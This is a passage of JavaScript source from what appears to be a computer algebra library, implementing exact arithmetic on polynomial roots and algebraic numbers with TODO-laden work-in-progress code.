    var tmp = (!(oldE.getDenominator() instanceof Expression.Integer) || !(e.getDenominator() instanceof Expression.Integer));
    if (tmp) {
      e = c(e.getNumerator()).divide(c(e.getDenominator())); // something may change after the previous step
    }
  }*/


  p1 = c(p1);
  p2 = c(p2); //TODO: !?

  var s = p1.map(function (c) { return c.getDenominator().inverse(); }).getContent().getDenominator();
  p1 = p1.scale(s);
  p2 = p2.scale(s);

  if (!p1.hasIntegerCoefficients()) {
    // integer polynomial may not be a factor of v.polynomial if the last one is minimal
    //TODO: !?
    var ok = true;

    if (root instanceof PolynomialRoot) {
      var interval = new LazyPolynomialRoot(p1, Polynomial.of(Expression.ONE), root).toDecimal(53); //!new - trying to optimize (!)

      ok = interval.b.sign() >= 0 && interval.a.sign() <= 0;
    }

    if (ok) {
      //TODO: use polynomial from the start - ?
      if (p1.hasRoot(v)) {
        //Note: slow
        return [Polynomial.ZERO, Polynomial.of(Expression.ONE)];
      }
    }
  }

  return reduce(p1, p2);
}

PolynomialRoot._makeExpressionWithPolynomialRoot = makeExpressionWithPolynomialRoot;
LazyPolynomialRoot._makeExpressionWithPolynomialRoot = makeExpressionWithPolynomialRoot;

function simplifyExpressionWithPolynomialRoot(p1, p2, root) {
  var tmp = makeExpressionWithPolynomialRoot(p1, p2, root);
  return new LazyPolynomialRoot(tmp[0], tmp[1], root);
}

PolynomialRoot.create = function (polynomial, interval, options) {
  return new PolynomialRoot(polynomial, interval, options);
};

LazyPolynomialRoot.create = function (polynomial, interval, options) {
  return fromRoot(new PolynomialRoot(polynomial, interval, options));
};

function fromRoot(root) {
  return new LazyPolynomialRoot(Polynomial.of(Expression.ZERO, Expression.ONE), Polynomial.of(Expression.ONE), root);
}

LazyPolynomialRoot.prototype.scale = function (k) {
  console.assert(Expression.isRealAlgebraicNumber(k));

  var result1 = this._p1.scale(k.getNumerator());

  var result2 = this._p2.scale(k.getDenominator());

  return k instanceof Expression.Integer ? new LazyPolynomialRoot(result1, result2, this._root) : simplifyExpressionWithPolynomialRoot(result1, result2, this._root);
};

LazyPolynomialRoot.prototype.translate = function (k) {
  console.assert(Expression.isRealAlgebraicNumber(k));
  return simplifyExpressionWithPolynomialRoot(this._p1.scale(k.getDenominator()).add(this._p2.scale(k.getNumerator())), this._p2.scale(k.getDenominator()), this._root);
};

var toPolynomialWithIntegerCoefficients = function (polynomial) {
  if (!polynomial.hasIntegerCoefficients()) {
    var variable = new Expression.Symbol('$$');
    var e = polynomial.calcAt(variable);
    var c = Expression.getConjugateExpression(e);

    if (c != null && !c.equals(e)) {
      //TODO: what if multiple (?) - ?
      return Polynomial.toPolynomial(c, variable);
    }
  }

  return polynomial;
};

function upgrade(root, p1, p2) {
  if (p1.getDegree() === 1 && p1.getCoefficient(0).equals(Expression.ZERO) && p1.getCoefficient(1).equals(Expression.ONE)) {
    // short path
    if (p2.getDegree() === 0) {
      if (p2.getCoefficient(0).equals(Expression.ONE)) {
        return root;
      }

      return root.scale(p2.getCoefficient(0).inverse()); // short path 2
    }
  }

  if (p1.equals(Polynomial.ZERO)) {
    return PolynomialRoot.create(Polynomial.of(Expression.ZERO, Expression.ONE), {
      a: Expression.ZERO,
      b: Expression.ZERO
    });
  }

  if (p1.getDegree() === 0 && p2.getDegree() === 0 && p2.getCoefficient(0).equals(Expression.ONE)) {
    var x = p1.getCoefficient(0);
    return PolynomialRoot.create(Polynomial.of(x.negate(), Expression.ONE), {
      a: x,
      b: x
    });
  } //TODO: !?
  // e = (ax^n + b) / c
  // root._pow(n).scale(a).translate(b).scale(c.inverse())


  if (p2.getDegree() === 0 && p2.getCoefficient(0).equals(Expression.ONE) && p1.getDegree() === p1.getGCDOfTermDegrees() && p1.getLeadingCoefficient().equals(Expression.ONE) && p1.getCoefficient(0).equals(Expression.ZERO) && p1.getDegree() === root.polynomial.getGCDOfTermDegrees()) {
    //TODO: other cases !!!
    return root._pow(p1.getDegree());
  }

  if (p2.getDegree() === 0 && p2.getCoefficient(0).equals(Expression.ONE) && p1.getDegree() === 1 && p1.getCoefficient(1).equals(Expression.ONE)) {
    return root.translate(p1.getCoefficient(0));
  }

  if (p2.getDegree() === 0 && p1.getDegree() === 1 && p1.getCoefficient(0).equals(Expression.ZERO)) {
    return root.scale(p1.getCoefficient(1).divide(p2.getCoefficient(0)));
  }

  var scale = Expression.ONE;

  if (p2.getDegree() === 0 && p2.hasIntegerCoefficients()) {
    scale = p2.getLeadingCoefficient();
    p2 = Polynomial.of(Expression.ONE);
  }

  var polynomial = p1.subtract(Polynomial.of(new Expression.Symbol('Î²')).multiply(p2));
  polynomial = toPolynomialWithIntegerCoefficients(polynomial); //TODO: ???

  var toPInBeta = function (c) { return new Expression.Polynomial(Polynomial.of(c)); };

  polynomial = polynomial.map(function (c) { return new Expression.Polynomial(Polynomial.toPolynomial(c, new Expression.Symbol('Î²'))); }); //TODO: ?

  var newPolynomial = Polynomial.resultant(polynomial, root.polynomial.map(toPInBeta)).polynomial.primitivePart();

  if (scale !== Expression.ONE) {
    // "unscale"
    newPolynomial = newPolynomial._scaleRoots(scale.inverse()).primitivePart();
  }

  return PolynomialRoot._calculateNewInterval(newPolynomial, function (precision) {
    return toSimpleInterval(new Expression.ExpressionPolynomialRoot(new LazyPolynomialRoot(p1, p2.scale(scale), root)), precision);
  });
}

LazyPolynomialRoot.prototype.multiply = function (other) {
  if (this._root.equals(other._root)) {
    return simplifyExpressionWithPolynomialRoot(this._p1.multiply(other._p1), this._p2.multiply(other._p2), this._root);
  }

  var root = upgrade(this._root, this._p1, this._p2).multiply(upgrade(other._root, other._p1, other._p2));
  return fromRoot(root);
};

LazyPolynomialRoot.prototype.add = function (other) {
  if (this._root.equals(other._root)) {
    var g = other._p2.getContent().gcd(this._p2.getContent());

    return simplifyExpressionWithPolynomialRoot(this._p1.multiply(other._p2.scale(g.inverse())).add(other._p1.multiply(this._p2.scale(g.inverse()))), this._p2.scale(g.inverse()).multiply(other._p2.scale(g.inverse())).scale(g), this._root);
  }

  var root = upgrade(this._root, this._p1, this._p2).add(upgrade(other._root, other._p1, other._p2));
  return fromRoot(root);
};

LazyPolynomialRoot.prototype.negate = function () {
  return new LazyPolynomialRoot(this._p1.negate(), this._p2, this._root);
};

LazyPolynomialRoot.prototype.inverse = function () {
  return simplifyExpressionWithPolynomialRoot(this._p2, this._p1, this._root);
};

LazyPolynomialRoot.prototype.sign = function () {
  if (this._p1.equals(Polynomial.ZERO)) {
    return 0;
  } //return this.e;
  //?
  //TODO: ???
  //var s = toDecimalStringInternal(new Expression.ExpressionPolynomialRoot(this), {significantDigits: 1});
  //return s.startsWith('-') ? -1 : +1;


  var precision = 1;

  while (true) {
    var interval = this.toDecimal(precision);

    if (interval.a.getNumerator().sign() >= 0) {
      return +1;
    }

    if (interval.b.getNumerator().sign() <= 0) {
      return -1;
    }

    precision *= 2;

    if (precision > 8) {
      console.debug('hm...');
    }
  }
};

LazyPolynomialRoot.prototype._pow = function (n) {
  //TODO: modular exponentiation (?)
  return simplifyExpressionWithPolynomialRoot(this._p1._pow(n), this._p2._pow(n), this._root);
};

LazyPolynomialRoot.prototype._nthRoot = function (n) {
  //?
  if (this._p2.getDegree() === 0 && this._p2.getCoefficient(0).equals(Expression.ONE) && this._p1.getDegree() === 1 && this._p1.getCoefficient(0).equals(Expression.ZERO) && this._p1.getCoefficient(1).equals(Expression.ONE)) {
    //TODO: ?
    var newRoot = this._root._nthRoot(n);

    return new LazyPolynomialRoot(Polynomial.of(Expression.ZERO, Expression.ONE), Polynomial.of(Expression.ONE), newRoot);
  }

  var getPerfectPower = function (p, n) {
    var root = p.getSquareFreePolynomial();
    return root._pow(n).equals(p) ? root : null;
  };

  var root = getPerfectPower(this._p1, n);

  var c = this._p2.getCoefficient(0);

  if (root != null && this._p2.getDegree() === 0 && c instanceof Expression.Integer && c.sign() > 0) {
    return simplifyExpressionWithPolynomialRoot(root, Polynomial.of(c._nthRoot(n)), this._root);
  }

  return this.upgrade()._nthRoot(n);
};

LazyPolynomialRoot.prototype.equals = function (other) {
  if (this._root.equals(other._root)) {
    //TODO:? ?
    return this._p1.equals(other._p1) && this._p2.equals(other._p2) || this.add(other.negate()).sign() === 0;
  } //!TODO: remove (hack to avoid error)


  if (toDecimalStringInternal(new Expression.ExpressionPolynomialRoot(this), {
    significantDigits: 3
  }) !== toDecimalStringInternal(new Expression.ExpressionPolynomialRoot(other), {
    significantDigits: 3
  })) {
    return false;
  } //!


  var result = upgrade(this._root, this._p1, this._p2).equals(upgrade(other._root, other._p1, other._p2));
  return result;
};

PolynomialRoot.prototype.upgrade = function () {
  return this;
};

LazyPolynomialRoot.prototype.upgrade = function () {
  return fromRoot(upgrade(this._root, this._p1, this._p2));
};

PolynomialRoot.prototype._calc = function (polynomial) {
  return upgrade(this, polynomial.calcAt($Î±()));
};

LazyPolynomialRoot.prototype._calc = function (polynomial) {
  var e = polynomial.calcAt(this.getAlphaExpression());
  return simplifyExpressionWithPolynomialRoot(Polynomial.toPolynomial(e.getNumerator(), $Î±()), Polynomial.toPolynomial(e.getDenominator(), $Î±()), this._root);
};

PolynomialRoot.prototype.getAlpha = function (polynomial) {
  // simple object is returned to not expose the PolynomialRoot
  return {
    polynomial: this.polynomial,
    interval: this.interval
  };
};

LazyPolynomialRoot.prototype.getAlpha = function (polynomial) {
  return this._root.getAlpha();
}; //TODO: return polynomials (?)


PolynomialRoot.prototype.getAlphaExpression = function (polynomial) {
  return $Î±();
};

LazyPolynomialRoot.prototype.getAlphaExpression = function (polynomial) {
  return this._p1.calcAt($Î±()).divide(this._p2.calcAt($Î±()));
};

PolynomialRoot.prototype.getAlphaPolynomial = function (polynomial) {
  return Polynomial.of(Expression.ZERO, Expression.ONE);
};

LazyPolynomialRoot.prototype.getAlphaPolynomial = function (polynomial) {
  return [this._p1, this._p2];
}; //LazyPolynomialRoot.PolynomialRoot = PolynomialRoot;//TODO: REMOVE!!!


globalThis.testables = globalThis.testables || {};
globalThis.testables.LazyPolynomialRoot = LazyPolynomialRoot;
globalThis.testables.PolynomialRoot = PolynomialRoot;
globalThis.testables.toSimpleInterval = toSimpleInterval;
globalThis.testables.SimpleInterval = SimpleInterval;

if (true) {
  //TODO: move to tests
  console.assert(Object.keys(PolynomialRoot).join(' ') === Object.keys(LazyPolynomialRoot).join(' '));
  console.assert(Object.keys(PolynomialRoot.prototype).join(' ') === Object.keys(LazyPolynomialRoot.prototype).join(' '));
  console.assert(PolynomialRoot.prototype.__proto__ === LazyPolynomialRoot.prototype.__proto__);
} //self.PolynomialRoot = PolynomialRoot;


self.LazyPolynomialRoot = LazyPolynomialRoot;
})();
(function () {
"use strict";




//TODO: !?


//var SimpleInterval = LazyPolynomialRoot.SimpleInterval;
//var PolynomialRoot = LazyPolynomialRoot.PolynomialRoot;


function PolynomialRootSymbol(polynomial, interval) {
  Expression.Symbol.call(this, "[root of " + polynomial + " near " + interval.a.add(interval.b).divide(Expression.TWO).toString() + "]");
  this.polynomial = polynomial;
  //TODO: https://www.wolframalpha.com/input/?i=x**5%2B7x**3%2Bx**2%2Bx%2B1%3D0
  this.interval = interval;
}
PolynomialRootSymbol.prototype = Object.create(Expression.Symbol.prototype);

PolynomialRootSymbol.prototype.toDecimal = function (precision) {
  return this.polynomial.getZero(this.interval, precision);
};

PolynomialRootSymbol.prototype.isExact = function () {
  //TODO: fix - ?
  return false;
};


PolynomialRootSymbol.prototype.toMathML = function (options) {
  options = options || {};
  if (options.fractionDigits != null) {
    throw new TypeError('options.fractionDigits is deprecated, please use options.rounding');
  }
  var rounding = options.rounding || {fractionDigits: 3};
  var tmp = toDecimalStringInternal(this, rounding, Expression._decimalToMathML, Expression._complexToMathML);
  return tmp;
};

PolynomialRootSymbol.prototype.isNegative = function () {
  return this.sign() < 0;
};

Expression.PolynomialRootSymbol = PolynomialRootSymbol;

function isSameRoot(x, y) {
  return x instanceof Expression.PolynomialRootSymbol && y instanceof Expression.PolynomialRootSymbol && x.polynomial.equals(y.polynomial) && x.interval.a.equals(y.interval.a) && x.interval.b.equals(y.interval.b);
}

function ExpressionWithPolynomialRoot(e, root) {
  this.e = e; // internal symbolic expression with a "root" as a symbol
  this.root = root;
}




ExpressionWithPolynomialRoot.prototype = Object.create(Expression.Symbol.prototype);

/*
ExpressionWithPolynomialRoot.prototype.compare4Multiplication = function (y) {
  return y.compare4MultiplicationExpressionWithPolynomialRoot(this);
};
ExpressionWithPolynomialRoot.prototype.compare4MultiplicationExpressionWithPolynomialRoot = function (x) {
  return 0;//?
};
Expression.prototype.compare4MultiplicationExpressionWithPolynomialRoot = function (x) {
  return this.compare4MultiplicationSymbol(x);//?
};
Expression.Symbol.prototype.compare4MultiplicationExpressionWithPolynomialRoot = function (x) {
  return -1;
};
ExpressionWithPolynomialRoot.prototype.compare4MultiplicationSymbol = function (x) {
  return +1;
};
*/

//Expression.prototype.isExact = function () {
//  return true;
//};
ExpressionWithPolynomialRoot.prototype.isExact = function () {
  //TODO: fix - ?
  return false;
};

function simplifyExpressionWithPolynomialRoot(e, root) {
  var tmp = LazyPolynomialRoot._makeExpressionWithPolynomialRoot(Polynomial.toPolynomial(e.getNumerator(), root), Polynomial.toPolynomial(e.getDenominator(), root), root);
  var e1 = tmp[0].calcAt(root).divide(tmp[1].calcAt(root));
  if (tmp[0].getDegree() <= 0 &&
      tmp[1].getDegree() <= 0) {
    return e1;
  }
  return new ExpressionWithPolynomialRoot(e1, root);
}

ExpressionWithPolynomialRoot.prototype.negate = function () {
  return new ExpressionWithPolynomialRoot(this.e.negate(), this.root); // for performance
};
ExpressionWithPolynomialRoot.prototype.equals = function (other) {
  //!TODO: remove (hack to avoid error)
  if (this instanceof ExpressionWithPolynomialRoot && other instanceof ExpressionWithPolynomialRoot) {
    if (!isSameRoot(this.root, other.root)) {
      //var s1 = toDecimalStringInternal(new Expression.Addition(this.e, other.e.negate()), {fractionDigits: 3});
      //if (s1 != undefined && !s1.endsWith('000')) {
      //  return false;
      //}
      if (this.toMathML({rounding: {fractionDigits: 3}}) !== other.toMathML({rounding: {fractionDigits: 3}})) {
        return false;//?
      }
      if (true) {
        return this.upgrade().subtract(other.upgrade()).equals(Expression.ZERO);
      }
      var s = toDecimalStringInternal(new Expression.Addition(this.e, other.e.negate()), {significantDigits: 1});
      //TODO: will it hang for zero?
      return s === '0';
    }
  }
  //!
  //if (Expression.has(other, Expression.NthRoot)) {
  //  return this.upgrade().equals(Expression.toPolynomialRoot(other));//!?
  //}
  // optimization
  var s = other instanceof Expression.Integer && other.equals(Expression.ZERO) ? this : this.subtract(other);
  return s instanceof ExpressionWithPolynomialRoot ? false : s.equals(Expression.ZERO);
};
ExpressionWithPolynomialRoot.prototype.simplifyExpression = function () {
  return this;
};

ExpressionWithPolynomialRoot.prototype.toString = function (options) {
  options = options || {};
  if (LazyPolynomialRoot._isSimpleForUpgrade(this.e, this.root)) {
    return this.upgrade().toString(options);
  }
  //TODO: return 'polynomial-root of x**2+2x+1 on [a; b]';
  //TODO:
  if (this.equals(Expression.ZERO)) {
    return Expression.ZERO.toString(options);
  }
  //return this.e.toString(options);
  if (options.fractionDigits != null) {
    throw new TypeError('options.fractionDigits is deprecated, please use options.rounding');
  }
  var rounding = options.rounding || {fractionDigits: 3};
  //if (true) {
  //  return Expression.toDecimalString(this.e, Object.assign({}, options, {rounding: rounding}));
  //}
  if (!Expression.isConstant(this.e)) {
    return this.upgrade().toString(options);
  }
  var tmp = toDecimalStringInternal(this.e, rounding, undefined, undefined);
  return tmp;
};

ExpressionWithPolynomialRoot.prototype.toMathML = function (options) {
  options = options || {};
  if (LazyPolynomialRoot._isSimpleForUpgrade(this.e, this.root)) {
    return this.upgrade().toMathML(options);
  }
  //TODO:
  if (this.equals(Expression.ZERO)) {
    return Expression.ZERO.toMathML(options);
  }
  //return this.e.toMathML(options);
  if (options.fractionDigits != null) {
    throw new TypeError('options.fractionDigits is deprecated, please use options.rounding');
  }
  var rounding = options.rounding || {fractionDigits: 3};
  if (true) {
    //return Expression.toDecimalString(this.e, );
    return this.e.toMathML(Object.assign({}, options, {rounding: rounding}));
  }
  var tmp = toDecimalStringInternal(this.e, rounding, Expression._decimalToMathML, Expression._complexToMathML);
  return tmp;
};

var calculateNewInterval = LazyPolynomialRoot._calculateNewInterval;//TODO: remove
var toSimpleInterval = LazyPolynomialRoot._toSimpleInterval;//TODO: remove

function upgrade(e, root) {
  if (e.equals(Expression.ZERO)) {
    return e;
  }
  if (e instanceof Expression.Integer) {
    return e;
  }
  var variable = root;
    //!new 2021-04-03
  if (true) {
      var p1 = Polynomial.toPolynomial(e.getNumerator(), variable);
      var p2 = Polynomial.toPolynomial(e.getDenominator(), variable);
      if (p1.hasIntegerCoefficients() && p2.hasIntegerCoefficients()) {
        if (e.getDenominator() instanceof Expression.Integer && !e.getDenominator().equals(Expression.ONE)) {
          //TODO: optimize (?)
          return upgrade(e.getNumerator(), root).divide(e.getDenominator());
        }
        // Let p1/p2 = beta, so beta is a root of Res_x(p1-beta*p2, p):
        //debugger;
        var resultant = Polynomial.toPolynomial(Polynomial.resultant(p1.subtract(Polynomial.of(new Expression.Symbol('Î²')).multiply(p2)), root.polynomial), new Expression.Symbol('Î²')).primitivePart();
        var tmp = calculateNewInterval(resultant, function (precision) {
          return toSimpleInterval(e, precision);
        });
        var interval = tmp.interval;
        var newPolynomial = tmp.polynomial;
        return Expression.ExpressionPolynomialRoot._create(newPolynomial, interval);
      }
      //!new 2021-05-14 (TODO: CHECK)
      if (p2.hasIntegerCoefficients() && p1.hasComplexCoefficients()) {
        return upgrade(p1.map(function (c) { return c instanceof Expression.Integer ? c : c.real; }).calcAt(variable).divide(p2.calcAt(variable)), root).add(upgrade(p1.map(function (c) { return c instanceof Expression.Integer ? Expression.ZERO : c.imaginary; }).calcAt(variable).divide(p2.calcAt(variable)), root).multiply(Expression.I));
      }
      //!
      //TODO: using grouping
    //}
    //debugger;
  }
  //!
  
  var cache = null;//TODO: ?
  var root = null;
  return Expression._map(function (x) {
    return x instanceof Expression.PolynomialRootSymbol && !(x instanceof Expression.ExpressionPolynomialRoot) ? (x === cache ? root : (cache = x, root = Expression.ExpressionPolynomialRoot.create(x.polynomial, x.interval))) : x;
  }, e);
}

ExpressionWithPolynomialRoot.prototype.multiply = function (other) {
  if (other instanceof ExpressionWithPolynomialRoot) {
    if (this.root !== other.root && !isSameRoot(this.root, other.root)) {
      return this.upgrade().multiply(other.upgrade());
    }
    return this.multiply(other.e);
  }
  if (Expression.has(other, Expression.ExpressionPolynomialRoot)) {//TODO: ?
    return this.upgrade().multiply(other);
  }
  return simplifyExpressionWithPolynomialRoot(this.e.multiply(other), this.root);
};
ExpressionWithPolynomialRoot.prototype.add = function (other) {
  if (other instanceof ExpressionWithPolynomialRoot) {
    if (this.root !== other.root && !isSameRoot(this.root, other.root)) {
      return this.upgrade().add(other.upgrade());
    }
    return this.add(other.e);
  }
  if (Expression.has(other, Expression.ExpressionPolynomialRoot)) {//TODO: ?
    return this.upgrade().add(other);
  }
  return simplifyExpressionWithPolynomialRoot(this.e.add(other), this.root);
};





ExpressionWithPolynomialRoot.prototype.divide = function (other) {
  if (other.equals(Expression.ONE)) {
    return this;
  }
  if (other instanceof ExpressionWithPolynomialRoot) {
    if (this.root !== other.root && !isSameRoot(this.root, other.root)) {
      return this.upgrade().divide(other.upgrade());
    }
    return this.divide(other.e);
  }
  if (Expression.has(other, Expression.ExpressionPolynomialRoot)) {//TODO: ?
    return this.upgrade().divide(other);
  }
  return simplifyExpressionWithPolynomialRoot(this.e.divide(other), this.root);
};

ExpressionWithPolynomialRoot.prototype.divideExpression = function (other) {
  if (Expression.has(other, Expression.ExpressionPolynomialRoot)) {//TODO: ?
    return other.divide(this.upgrade());
  }
  return simplifyExpressionWithPolynomialRoot(other.divide(this.e), this.root);
};
ExpressionWithPolynomialRoot.prototype.multiplyExpression = function (other) {
  if (other.equals(Expression.ONE)) {
    return this;
  }
  if (Expression.has(other, Expression.ExpressionPolynomialRoot)) {//TODO: ?
    return other.multiply(this.upgrade());
  }
  return simplifyExpressionWithPolynomialRoot(other.multiply(this.e), this.root);
};
ExpressionWithPolynomialRoot.prototype.addExpression = function (other) {
  if (Expression.has(other, Expression.ExpressionPolynomialRoot)) {//TODO: ?
    return other.add(this.upgrade());
  }
  return simplifyExpressionWithPolynomialRoot(other.add(this.e), this.root);
};

ExpressionWithPolynomialRoot.prototype.getPrecedence = function () {
  if (Expression.isReal(this)) {
    return 1000;
  }
  //return this.e.getPrecedence();//? - division
  return 2; // it can be a complex number
};
ExpressionWithPolynomialRoot.prototype.isRightToLeftAssociative = function () {
  return true;
};
ExpressionWithPolynomialRoot.prototype.isUnaryPlusMinus = function () {
  if (Expression.isReal(this)) {
    return false;
  }
  return true;
};

ExpressionWithPolynomialRoot.prototype.isNegative = function () {
  //TODO: ?
  if (Expression.isReal(this)) {
    return !Expression._isPositive(this);
  }
  return this.e.isNegative();
};


ExpressionWithPolynomialRoot.prototype._nthRoot = function (n) {//?
  if (this.e === this.root) {//TODO: ?
    // PolynomialRootSymbol#_nthRoot - ?
    if (this.root.interval.a.getNumerator().compareTo(Expression.ZERO) < 0 && n % 2 === 0) {
      if (n !== 2) {
        throw new RangeError();
      }
      //TODO: check
      var newRoot = new Expression.PolynomialRootSymbol(this.root.polynomial._scaleRoots(Expression.ONE.negate()), {a: this.root.interval.b.negate(), b: this.root.interval.a.negate()});
      return Expression.I.multiply(new ExpressionWithPolynomialRoot(newRoot, newRoot)._nthRoot(n));
    }
    var newPolynomial = this.root.polynomial._exponentiateRoots(1 / n);

    var e = Expression.NthRoot.makeRoot(this.e, n);
    var tmp = calculateNewInterval(newPolynomial, function (precision) {
      return toSimpleInterval(e, precision);
    });
    var interval = tmp.interval;
    newPolynomial = tmp.polynomial;

    var newRoot = new Expression.PolynomialRootSymbol(newPolynomial, interval);
    if (newRoot.polynomial.numberOfRoots(newRoot.interval) === 1) {
      return new ExpressionWithPolynomialRoot(newRoot, newRoot);
    } else {
      console.assert(false);
      debugger;
    }
  }
  if (!(this.e instanceof Expression.Exponentiation)) {
    if (true && n === 2) {
      return this.upgrade()._nthRoot(n);
    }
  }
  var getPerfectPower = function (e1, n, v) {
    var p = Polynomial.toPolynomial(e1, v);
    var root = p.getSquareFreePolynomial();
    return root._pow(n).equals(p) ? root.calcAt(v) : null;
  };
  var root = getPerfectPower(this.e.getNumerator(), n, this.root);
  if (root == null || !Expression.isReal(this.e)) {
    return this.upgrade()._nthRoot(n);
  }
  return simplifyExpressionWithPolynomialRoot(this.e._nthRoot(n), this.root);
};
ExpressionWithPolynomialRoot.prototype.pow = function (count) {
  if (count instanceof Expression.Division && count.getDenominator() instanceof Expression.Integer) {
    return this._nthRoot(count.getDenominator().toNumber()).pow(count.getNumerator());
  }
  //TODO: upgrade (?)
  return simplifyExpressionWithPolynomialRoot(this.e.pow(count), this.root);
};
ExpressionWithPolynomialRoot.prototype._pow = function (count) {
  return simplifyExpressionWithPolynomialRoot(this.e.getNumerator()._pow(count), this.root).divide(simplifyExpressionWithPolynomialRoot(this.e.getDenominator()._pow(count), this.root));
};

//TODO: remove
ExpressionWithPolynomialRoot.prototype.upgrade = function () {
  return upgrade(this.e, this.root);
};

ExpressionWithPolynomialRoot.prototype.complexConjugate = function () {
  return simplifyExpressionWithPolynomialRoot(this.e.complexConjugate(), this.root);
};

ExpressionWithPolynomialRoot.prototype.toDecimal = function (precision) {
precision = precision == undefined ?  0 : precision;

  return this.e === this.root ? this.root.toDecimal(precision) : this.upgrade().toDecimal(precision);
};


//!new
ExpressionWithPolynomialRoot.prototype._calc = function (polynomial) {
  return simplifyExpressionWithPolynomialRoot(polynomial.calcAt(this.e), this.root);
};

self.ExpressionWithPolynomialRoot = ExpressionWithPolynomialRoot;

})();
(function () {
"use strict";

//TODO: !?


function SomePolynomialRoot(e, polynomial) {
  this.e = e; // internal symbolic expression with a "root" as a symbol
  this.polynomial = polynomial;
}

SomePolynomialRoot.prototype = Object.create(Expression.Symbol.prototype);

function alpha() {
  return new Expression.Symbol('alpha');
}

SomePolynomialRoot.create = function (polynomial) {
  return new SomePolynomialRoot(alpha(), polynomial);
};

SomePolynomialRoot.prototype.isExact = function () {
  return false;
};

function simplifyExpressionWithPolynomialRoot(e, polynomial) {
  
  var n = Polynomial.toPolynomial(e.getNumerator(), alpha()).divideAndRemainder(polynomial).remainder;
  var d = Polynomial.toPolynomial(e.getDenominator(), alpha()).divideAndRemainder(polynomial).remainder;
  if (d.getDegree() > 0) {
    var scale = d.modularInverse(polynomial).primitivePart();
    d = d.multiply(scale).divideAndRemainder(polynomial).remainder;
    n = n.multiply(scale).divideAndRemainder(polynomial).remainder;
  }
  var e1 = n.calcAt(alpha()).divide(d.calcAt(alpha()));
  if (e1 instanceof Expression.Integer) {
    return e1;
  }
  return new SomePolynomialRoot(e1, polynomial);
}

SomePolynomialRoot.prototype.negate = function () {
  return simplifyExpressionWithPolynomialRoot(this.e.negate(), this.polynomial);
};
SomePolynomialRoot.prototype.equals = function (other) {
  if (other === Expression.ZERO) {
    return false;
  }
  return this.subtract(other).equals(Expression.ZERO);
};
SomePolynomialRoot.prototype.simplifyExpression = function () {
  return this;
};

SomePolynomialRoot.prototype.toString = function (options) {
  throw new TypeError();
};

SomePolynomialRoot.prototype.toMathML = function (options) {
  throw new TypeError();
};

SomePolynomialRoot.prototype.multiply = function (other) {
  if (other instanceof SomePolynomialRoot) {
    if (!this.polynomial.equals(other.polynomial)) {
      throw new TypeError();
    }
    return simplifyExpressionWithPolynomialRoot(this.e.multiply(other.e), this.polynomial);
  }
  return simplifyExpressionWithPolynomialRoot(this.e.multiply(other), this.polynomial);
};
SomePolynomialRoot.prototype.add = function (other) {
  if (other instanceof SomePolynomialRoot) {
    if (!this.polynomial.equals(other.polynomial)) {
      throw new TypeError();
    }
    return simplifyExpressionWithPolynomialRoot(this.e.add(other.e), this.polynomial);
  }
  return simplifyExpressionWithPolynomialRoot(this.e.add(other), this.polynomial);
};
SomePolynomialRoot.prototype.inverse = function () {
  return simplifyExpressionWithPolynomialRoot(this.e.inverse(), this.polynomial);
};

SomePolynomialRoot.prototype.divide = function (other) {
  return this.multiply(other.inverse());
};

SomePolynomialRoot.prototype.divideExpression = function (other) {
  return other.multiply(this.inverse());
};
SomePolynomialRoot.prototype.multiplyExpression = function (other) {
  return simplifyExpressionWithPolynomialRoot(other.multiply(this.e), this.polynomial);
};
SomePolynomialRoot.prototype.addExpression = function (other) {
  return simplifyExpressionWithPolynomialRoot(other.add(this.e), this.polynomial);
};

SomePolynomialRoot.prototype.getPrecedence = function () {
  throw new TypeError();
};
SomePolynomialRoot.prototype.isRightToLeftAssociative = function () {
  throw new TypeError();
};
SomePolynomialRoot.prototype.isUnaryPlusMinus = function () {
  throw new TypeError();
};
SomePolynomialRoot.prototype.isNegative = function () {
  throw new TypeError();
};


SomePolynomialRoot.prototype._nthRoot = function (n) {//?
  throw new TypeError();
};
SomePolynomialRoot.prototype.pow = function (count) {
  throw new TypeError();
};
SomePolynomialRoot.prototype._pow = function (count) {
  throw new TypeError();
};


SomePolynomialRoot.prototype.calcAt = function (x, xPows) {
  var c = function (e) {
    var p = Polynomial.toPolynomial(e, alpha());
    //return p.calcAt(root);
    var s = Expression.ZERO;
    var start = Date.now();
    while (xPows.length <= p.getDegree()) {
      xPows.push(xPows[xPows.length - 1].multiply(x));
    }
    var end = Date.now();
    if (end - start > 10) {
      console.log('xPows', end - start);
    }
    for (var i = 0; i <= p.getDegree(); i += 1) {
      s = s.add(p.getCoefficient(i).multiply(xPows[i]));
    }
    return s;
  };
  var e = this.e;
  var e1 = c(e.getNumerator()).divide(c(e.getDenominator()));
  return e1;
};

self.SomePolynomialRoot = SomePolynomialRoot;

})();
(function () {
"use strict";











/*
Expression.PolynomialRootSymbol = function () {
  throw new TypeError();
};
function ExpressionWithPolynomialRoot() {
  throw new TypeError();
}
*/

Expression.ExpressionWithPolynomialRoot = ExpressionWithPolynomialRoot;


// wrapper around PolynomialRoot
function ExpressionPolynomialRoot(root) {
  var alpha = root.getAlpha();
  var $tmpp1_p2 = root.getAlphaPolynomial(); var p1 = $tmpp1_p2[0]; var p2 = $tmpp1_p2[1];
  var polynomial = alpha.polynomial;
  var interval = alpha.interval;
  if (p1.getDegree() <= 0 && p2.getDegree() <= 0) {
    return p1.getCoefficient(0).divide(p2.getCoefficient(0));
  }
  if (polynomial.getDegree() === 1 || polynomial.getDegree() === 2 || (polynomial.getDegree() === 4 && false) || polynomial.getDegree() === polynomial.getGCDOfTermDegrees()) {//TODO: other - ? like biqudratic - ?
    var roots = polynomial.getDegree() === polynomial.getGCDOfTermDegrees() && polynomial.getDegree() % 2 === 1 ? [polynomial.getCoefficient(0).negate().divide(polynomial.getLeadingCoefficient())._nthRoot(polynomial.getDegree())] : polynomial.getroots();
    for (var iteratorrr = roots[globalThis.Symbol.iterator](), rr = iteratorrr.next().value; rr != null; rr = iteratorrr.next().value) {
      if (!Expression.has(rr, ExpressionPolynomialRoot)) {//?
        if (Expression._isPositive(rr.subtract(interval.a)) && Expression._isPositive(rr.subtract(interval.b).negate()) || rr.equals(interval.b) || rr.equals(interval.a)) {
          if (p1.getDegree() === 1 && p1.getCoefficient(0).equals(Expression.ZERO) && p1.getCoefficient(1).equals(Expression.ONE) && p2.getDegree() === 0 && p2.getCoefficient(0).equals(Expression.ONE)) {//TODO: ???
            return rr;//TODO: MOVE!
          } else {
            var n = p1.calcAt(rr);
            var d = p2.calcAt(rr);
            return n.divide(d);
          }
        }
      }
    }
  }
  if (polynomial.getDegree() < 3) {
    throw new TypeError();
  }
